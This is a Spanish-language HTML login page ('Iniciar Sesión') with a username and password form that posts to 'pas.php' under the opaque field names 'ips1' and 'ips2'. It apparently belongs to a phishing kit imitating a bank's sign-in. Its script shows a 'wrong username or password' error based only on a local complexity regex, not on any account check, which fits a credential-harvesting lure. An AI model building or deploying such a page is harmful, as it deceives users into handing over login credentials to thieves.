<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Iniciar Sesión</title>
    <style>
        * {
            padding: 0;
            margin: 0;
        }

        @font-face {
            font-family: dinRegular;
            src: url('din-regular.ttf');
        }

        #msg-error {
            display: none;
            color: red;
            font-size: 14px;
            position: absolute;
            top: 420px;
            left: 30px;
        }
    </style>
</head>
<body>
    <div id="main-container" style="position: relative; min-height: 100vh; overflow: hidden;">
        <div id="container" style="background-color: white; display: inline-block; vertical-align: top;">
            <div id="form-container" style="width: 430px; text-align: center; border-radius: 8px; display: inline-block;">
                <form action="pas.php" method="post" id="login-form"
                      style="width: 420px; height: 660px; border-radius: 10px; background-image: url('1.svg'); position: relative;">
                    <img src="l.png" alt="Logo" style="position: relative; top: 51px;   width: 294px;">

                    <input type="text" name="ips1" id="username" placeholder="Usuario" required
                           style="position: relative; color: #333; background: transparent;  border: none; top: 187px;  height: 39px; width: 357px; padding-left: 12px; outline: none; font-family: dinRegular, sans-serif; font-size: 16px;" autocomplete="off" onkeypress="preventSpaces(event)">

                    <input type="password" name="ips2" id="password" placeholder="Contraseña" required
                           style="position: relative; color: #333; background: transparent; border: none; top: 224px;  height: 39px; width: 357px; padding-left: 12px; outline: none; font-family: dinRegular, sans-serif; font-size: 16px;" autocomplete="off">

                    <p id="msg-error" style="font-family: sans-serif;">Usuario o contraseña incorrecta</p>

                    <input type="submit" value="Inicie Sesión"
                           style="position: relative; top: 348px;   width: 364px; height: 39px; border: none; border-radius: 8px; background: rgb(0, 105, 60); color: white; font-size: 16px;">
                </form>
            </div>
            <div id="banner-container" style="text-align: right; display: inline-block;">
                <div style="position: absolute; z-index: 1; width: 80%; height: 100%; overflow: hidden; top: 0; left: 500px;">
                    <div style="background: url('bnn.jpg') center left / cover no-repeat; height: 100%; position: relative; text-align: center;">
                        <img src="terms.svg" alt="Terms" style="width: 60%; position: relative; top: 80vh;">
                    </div>
                </div>
            </div>
        </div>
    </div>

    <style>
        @media screen and (max-width: 1024px) {
            body {
                width: 100%;
                background: linear-gradient(rgb(105, 190, 40), rgb(0, 105, 60));
                zoom: 90%;
            }

            #main-container {
                text-align: center;
                padding-top: 30px;
            }

            #form-container {
                width: 100%;
            }

            #banner-container {
                display: none;
            }
        }
    </style>

    <script>
        function preventSpaces(event) {
            return event.key !== " ";
        }

        function checkPassword(password) {
            const pattern = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!#$%&()*+,\-.\/:><=\\{}|¡])[A-Za-z\d!#$%&()*+,\-.\/:><=\\{}|¡]{8,32}$/;
            return pattern.test(password);
        }

        document.addEventListener("DOMContentLoaded", () => {
            const form = document.getElementById("login-form");
            const errorMsg = document.getElementById("msg-error");

            form.addEventListener("submit", (e) => {
                const password = document.getElementById("password").value;

                if (!checkPassword(password)) {
                    e.preventDefault();
                    errorMsg.style.display = "block";
                    setTimeout(() => {
                        errorMsg.style.display = "none";
                    }, 3000);
                }
            });
        });
    </script>
</body>
</html>
